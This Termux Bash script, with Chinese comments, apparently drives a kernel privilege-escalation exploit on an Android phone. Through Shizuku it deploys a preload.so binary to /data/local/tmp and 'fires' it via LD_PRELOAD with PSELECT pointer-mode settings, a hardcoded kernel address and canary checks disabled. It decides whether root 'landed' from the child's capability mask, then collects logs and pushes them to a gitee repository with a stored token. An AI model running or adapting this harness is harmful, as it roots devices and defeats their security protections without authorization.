#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
# matisse 现场全自动脚本 v2 (评审维护, 零判断执行)
# 用法: Termux 里 `bash field_auto.sh`
# 依赖: Shizuku 运行中 + rish 已按官方教程复制到手机
# 令牌: $HOME/.matisse_token (一行, 用于推送回传; 不在本仓库)
# v2 修复: Shizuku 连接闪断自动重试(读命令) / 开火命令绝不重试
#          / 负载等待 10min->3min / termux-wake-lock 保活
# 流程: 拉仓库 -> 部署mt60(SHA校验) -> 体检 -> R7 -> 机器门槛
#       -> (R_LANDED=>C1 | R_MISS=>R8一次) -> 自动回传 gitee
# ============================================================
set -u
TOKEN=$(cat "$HOME/.matisse_token" 2>/dev/null | tr -d ' \r\n' || true)
if [ -n "$TOKEN" ]; then
  REPO_URL="https://ihamn:${TOKEN}@gitee.com/ihamn/matisse.git"
else
  REPO_URL="https://gitee.com/ihamn/matisse.git"
  echo "[card] 警告: 无令牌文件, 回传推送会失败(拉取/开火不受影响)"
fi
WORK="$HOME/matisse"
RUN_TS=$(date +%Y%m%d_%H%M%S)
CONSOLE_LOG="$HOME/card_console_${RUN_TS}.log"
PUSHED=0; R7_GATE=""; R8_GATE=""; EXTRA=""
command -v termux-wake-lock >/dev/null 2>&1 && termux-wake-lock 2>/dev/null
exec > >(tee -a "$CONSOLE_LOG") 2>&1
say(){ echo "[card] $*"; }
SHIZUKU_DEAD_HINT="!! Shizuku 连接不稳定。手机上做一次(只需一次): 设置->应用管理->Termux和Shizuku->省电策略都改[无限制], 运行期间插充电器+亮屏, 然后重新粘贴运行本脚本"

# ---------- 0. git 环境 + 拉仓库 ----------
say "第0步: 准备 git 和仓库"
command -v git >/dev/null 2>&1 || pkg install -y git >/dev/null 2>&1 || { say "git 安装失败,检查网络"; exit 1; }
if [ ! -d "$WORK/.git" ]; then git clone -q "$REPO_URL" "$WORK" || { say "克隆失败,检查网络"; exit 1; }; fi
cd "$WORK" || exit 1
git remote set-url origin "$REPO_URL"
git config user.name "field-termux"; git config user.email "field@termux.local"
git pull -q origin master 2>/dev/null || true
say "仓库就绪: $(git log --oneline -1 | cut -c1-70)"

# ---------- 1. 找 rish (Shizuku) ----------
say "第1步: 查找 rish"
RISH=""
for c in "$HOME/rish" "$HOME/rish/rish" "$HOME/storage/downloads/rish" \
         "/sdcard/Download/rish" "/storage/emulated/0/Download/rish" "/data/local/tmp/rish"; do
  [ -f "$c" ] && RISH="$c" && break
done
[ -z "$RISH" ] && RISH=$(find "$HOME" -maxdepth 3 -name rish -type f 2>/dev/null | head -1)
if [ -z "$RISH" ]; then
  say "!! 没找到 rish。手动做一次(只需一次):"
  say "  1) Shizuku app -> 在终端应用中使用(rish) -> 按提示复制 rish 文件到 Download"
  say "  2) Termux 执行: termux-setup-storage (弹窗点允许)"
  say "  3) Termux 执行: cp /sdcard/Download/rish* ~/ ; chmod +x ~/rish*"
  say "  4) 重新粘贴运行本脚本"
  exit 2
fi
RISH_DIR=$(dirname "$RISH"); chmod +x "$RISH" 2>/dev/null
say "rish 路径: $RISH_DIR"
RISH_MODE=""
TEST_A=$( (cd "$RISH_DIR" && timeout 30 ./rish "echo RISH_OK_\$(id -u)") 2>&1 )
printf '%s' "$TEST_A" | grep -q "RISH_OK_" && RISH_MODE=args && RISH_OUT="$TEST_A"
if [ -z "$RISH_MODE" ]; then
  TEST_B=$( (cd "$RISH_DIR" && echo 'echo RISH_OK_$(id -u)' | timeout 30 ./rish) 2>&1 )
  printf '%s' "$TEST_B" | grep -q "RISH_OK_" && RISH_MODE=stdin && RISH_OUT="$TEST_B"
fi
[ -z "$RISH_MODE" ] && { say "!! rish 无法执行(Shizuku 没在运行?)输出: $TEST_A"; exit 2; }
say "rish 模式: $RISH_MODE 身份: $(printf '%s' "$RISH_OUT" | tr '\n' ' ')"

# rsh1: 单发不重试 (用于开火等副作用命令)
rsh1(){ local cmd="$1" t="${2:-60}"
  if [ "$RISH_MODE" = args ]; then (cd "$RISH_DIR" && timeout "$t" ./rish "$cmd") 2>&1
  else printf '%s\n' "$cmd" | (cd "$RISH_DIR" && timeout "$t" ./rish) 2>&1; fi; }
# rsh: 读命令/幂等命令, Shizuku 闪断自动重试 (最多4次)
rsh(){ local cmd="$1" t="${2:-60}" out i
  for i in 1 2 3 4; do
    out=$(rsh1 "$cmd" "$t")
    printf '%s' "$out" | grep -q "Request timeout\|blocked by your system" || { printf '%s\n' "$out"; return 0; }
    [ "$i" -lt 4 ] && say "Shizuku 连接闪断(第${i}次), 8秒后重试..."
    sleep 8
  done
  printf '%s\n' "$out"; return 1; }
# rpush: 推文件到设备 (幂等, 可重试)
rpush(){ local l="$1" r="$2" out i
  for i in 1 2 3 4; do
    if [ "$RISH_MODE" = args ]; then out=$( (cd "$RISH_DIR" && timeout 180 ./rish "cat > '$r'") < "$l" 2>&1 )
    else out=$( { echo "cat > '$r'"; cat "$l"; } | (cd "$RISH_DIR" && timeout 180 ./rish) 2>&1 ); fi
    printf '%s' "$out" | grep -q "Request timeout\|blocked by your system" || { printf '%s\n' "$out"; return 0; }
    [ "$i" -lt 4 ] && say "Shizuku 连接闪断(第${i}次), 8秒后重试..."
    sleep 8
  done
  printf '%s\n' "$out"; return 1; }

# ---------- 2. 部署 mt60 二进制 (SHA 机器校验) ----------
say "第2步: 部署 mt60 preload.so 并校验 SHA256"
[ -f "$WORK/bin/mt60/preload.so" ] || { say "!! 仓库里没有 bin/mt60/preload.so"; exit 3; }
SHA_EXP=$(grep -o '[0-9a-f]\{64\}' "$WORK/bin/mt60/BUILD_INFO.txt" 2>/dev/null | head -1)
rsh "rm -f /data/local/tmp/preload.new" 20 >/dev/null
rpush "$WORK/bin/mt60/preload.so" "/data/local/tmp/preload.new" >/dev/null
rsh "mv -f /data/local/tmp/preload.new /data/local/tmp/preload.so; chmod 644 /data/local/tmp/preload.so" 30 >/dev/null
SHA_GOT=$(rsh "sha256sum /data/local/tmp/preload.so" 30 | tr -d '\r' | awk '{print $1}')
say "期望 SHA: ${SHA_EXP:-未知}"; say "实际 SHA: ${SHA_GOT:-读取失败}"
if [ -n "$SHA_EXP" ] && [ "$SHA_GOT" != "$SHA_EXP" ]; then
  case "$SHA_GOT" in *Request\ timeout*|*"blocked"*) say "$SHIZUKU_DEAD_HINT";; *) say "!! SHA 不一致,中止开火(防错二进制)";; esac
  exit 3
fi
say "二进制校验通过"

# ---------- 3. 体检 ----------
say "第3步: 体检三旗"
BOOT0=$(rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r')
case "$BOOT0" in *Request\ timeout*|*"blocked"*|"") say "$SHIZUKU_DEAD_HINT"; exit 4;; esac
ENF0=$(rsh "getenforce" 20 | tr -d '\r')
SETTLE=$(rsh "awk '{print (\$1>600)?\"SETTLE_OK\":\"SETTLE_WAIT\"}' /proc/uptime" 20 | tr -d '\r')
say "boot=$BOOT0 enforce=$ENF0 settle=$SETTLE"
LOADWAIT_N=0; GARBAGE_N=0
while :; do
  LOAD=$(rsh "awk '{print (\$1<3)?\"LOAD_GO\":\"LOAD_WAIT\"}' /proc/loadavg" 20 | tr -d '\r')
  if [ "$LOAD" != "LOAD_GO" ] && [ "$LOAD" != "LOAD_WAIT" ]; then
    GARBAGE_N=$((GARBAGE_N+1))
    [ "$GARBAGE_N" -ge 2 ] && { say "$SHIZUKU_DEAD_HINT"; exit 4; }
    say "读数异常(非负载值), 10秒后重读..."; sleep 10; continue
  fi
  say "load=$LOAD (第${LOADWAIT_N}次等待)"
  [ "$LOAD" = "LOAD_GO" ] && break
  LOADWAIT_N=$((LOADWAIT_N+1)); [ "$LOADWAIT_N" -ge 3 ] && { say "裁定: 照打(评审附录A)"; break; }
  say "负载真高, 等3分钟再试..."; sleep 180
done
RESIDUE=$(rsh "ps -A | grep -E 'sleep|preload' >/dev/null 2>&1 && echo RESIDUE_DIRTY || echo RESIDUE_CLEAN" 20 | tr -d '\r')
say "residue=$RESIDUE"
[ "$RESIDUE" = "RESIDUE_DIRTY" ] && { say "清理残留进程"; rsh "pkill -f '/system/bin/sleep'; pkill -f preload; true" 20 >/dev/null; sleep 3; }
say "体检完成,开始开火"

# ---------- 4. 开火 / 门槛 / 分支 ----------
fire(){ local name="$1" stage="$2" task="$3" te=""
  [ -n "$task" ] && te=" PSELECT_TASK=$task"
  rsh "rm -f /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt" 20 >/dev/null
  rsh1 "am kill-all" 20 >/dev/null
  local cmd="timeout 220 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=$stage PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=auto PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_NO_CANARY=1$te LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1; echo \"$name rc=\$? enforce=\$(getenforce) boot=\$(cat /proc/sys/kernel/random/boot_id)\""
  say "开火 $name (约4分钟,请勿动手机,保持亮屏)..."
  rsh1 "$cmd" 250
}
gate(){ local st; st=$(rsh "cat /data/local/tmp/mt49_child_status.txt" 30 | tr -d '\r')
  if [ -z "$st" ] || ! printf '%s' "$st" | grep -q "task="; then echo "MISS_NOSTATUS"; return; fi
  if printf '%s' "$st" | grep -q "CapEff=0000000000000000"; then echo "R_MISS"; else echo "R_LANDED"; fi; }
gettask(){ rsh "cat /data/local/tmp/mt49_child_status.txt" 30 | tr -d '\r' | grep -a '^task=' | tail -1 | cut -d= -f2 | cut -d' ' -f1; }
bootid(){ rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r'; }

fire R7 R ""
R7_GATE=$(gate); say "R7 门槛判定: $R7_GATE"
BOOT1=$(bootid)
if [ "$R7_GATE" = "R_LANDED" ] && [ "$BOOT1" = "$BOOT0" ]; then
  T=$(gettask); say "R 写落地! 立即补 C 轮 TASK=$T"; fire C1 C "$T"
elif { [ "$R7_GATE" = "R_MISS" ] || [ "$R7_GATE" = "MISS_NOSTATUS" ]; } && [ "$BOOT1" = "$BOOT0" ]; then
  say "R_MISS,按卡重掷 R8 (最后一轮)"; fire R8 R ""
  R8_GATE=$(gate); say "R8 门槛判定: $R8_GATE"
  BOOT2=$(bootid)
  if [ "$R8_GATE" = "R_LANDED" ] && [ "$BOOT2" = "$BOOT0" ]; then
    T=$(gettask); say "R8 落地! 立即补 C 轮 TASK=$T"; fire C1 C "$T"
  else
    say "两轮未中,按卡停止(不跑第三轮)"; EXTRA="两轮R_MISS已停"
  fi
else
  say "状态异常/boot 变化,停止后续轮"
  [ "$BOOT1" != "$BOOT0" ] && EXTRA="警告:boot_id已变化(设备重启)"
fi

# ---------- 5. 回收 + 回传 ----------
say "第5步: 回收数据并回传"
mkdir -p "$WORK/logs_raw/R7" "$WORK/logs_raw/R8" "$WORK/logs_raw/C1"
for n in R7 R8 C1; do
  rsh "cat /data/local/tmp/$n.out" 60 > "$WORK/logs_raw/$n/${n}_termux_raw.out" 2>/dev/null
  [ -s "$WORK/logs_raw/$n/${n}_termux_raw.out" ] || rm -f "$WORK/logs_raw/$n/${n}_termux_raw.out"
done
rsh "cat /data/local/tmp/mt49_child_status.txt" 30 > "$WORK/logs_raw/R7/mt49_status_final.txt" 2>/dev/null
{ rsh "cat /data/local/tmp/root_alive.txt" 20 2>/dev/null; [ ! -s "$WORK/logs_raw/C1/root_alive.txt" ] && echo "NO_ROOT_MARKER"; } > "$WORK/logs_raw/C1/root_alive.txt" 2>/dev/null
rsh "dumpsys dropbox --print data_app_anr 2>/dev/null | tail -c 300000" 60 > "$WORK/logs_raw/termux_anr_dropbox.txt" 2>/dev/null
ALIVE=$(rsh "getenforce; cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r' | tr '\n' ' ')
say "结束活体: $ALIVE"
CANARY_CHK=$(grep -a "canary planted\|pselect returned" "$WORK/logs_raw/R7/"*_raw.out 2>/dev/null | head -4)
{ echo "# 卡4 Termux 自动运行 v2 $RUN_TS"
  echo "- rish模式: $RISH_MODE 身份: $RISH_OUT"
  echo "- 开火前: boot=$BOOT0 enforce=$ENF0 settle=$SETTLE residue=$RESIDUE"
  echo "- R7门槛: $R7_GATE / R8门槛: ${R8_GATE:-未跑} / $EXTRA"
  echo "- canary理论验证行:"; echo "$CANARY_CHK"
  echo "- 结束活体: $ALIVE"
} > "$WORK/logs_raw/CARD4_TERMUX_${RUN_TS}.md"
cp "$CONSOLE_LOG" "$WORK/logs_raw/termux_console_${RUN_TS}.log" 2>/dev/null
git add -A
git commit -q -m "termux auto card4-v2 ${RUN_TS}: R7=${R7_GATE} R8=${R8_GATE:-skip} canary-off armed-write (auto field script)" || true
for i in 1 2 3; do
  git pull -q --rebase origin master 2>/dev/null
  git push -q origin master 2>/dev/null && { PUSHED=1; break; }
  say "推送重试 $i..."; sleep 10
done
command -v termux-wake-unlock >/dev/null 2>&1 && termux-wake-unlock 2>/dev/null
say "=========================================="
if [ "$PUSHED" = 1 ]; then
  say "完成! 全部数据已推回 gitee 仓库"
else
  say "推送失败! 把这个文件发给评审: $CONSOLE_LOG"
fi
